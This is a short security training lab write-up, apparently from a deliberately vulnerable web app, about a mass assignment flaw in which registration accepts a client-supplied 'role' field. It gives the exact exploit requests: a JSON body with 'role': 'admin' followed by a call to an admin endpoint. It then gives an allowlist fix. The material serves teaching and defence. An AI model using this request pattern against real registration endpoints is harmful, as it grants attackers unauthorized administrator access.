# Lab 04: Mass assignment on register

Registration copies unexpected JSON fields onto the `User` model, including `role`.

**OWASP Top 10:2025:** [A06 Insecure Design](https://owasp.org/Top10/2025/)

**Code:** `app/routes/account.py` (`register`); `app/models.py` (`User.role`)

## Exploit

1. `POST http://localhost:8888/account/register`
2. Header: `Content-Type: application/json`
3. Body:

```json
{
  "email": "eve@example.com",
  "username": "eve",
  "password": "eve12345",
  "display_name": "Eve",
  "role": "admin"
}
```

4. Response should include `"role": "admin"` and an `api_token`.
5. Confirm admin access:

```http
GET /api/v1/admin/users HTTP/1.1
Host: localhost:8888
Authorization: Bearer <api_token>
```

## Fix

Allowlist writable fields. Set role only server-side:

```python
ALLOWED = {"email", "username", "password", "display_name"}
# ... build User with role="customer" - never from client
```

Hiding the field in HTML is not enough. Read `SAFE:` comments in `account.py`.
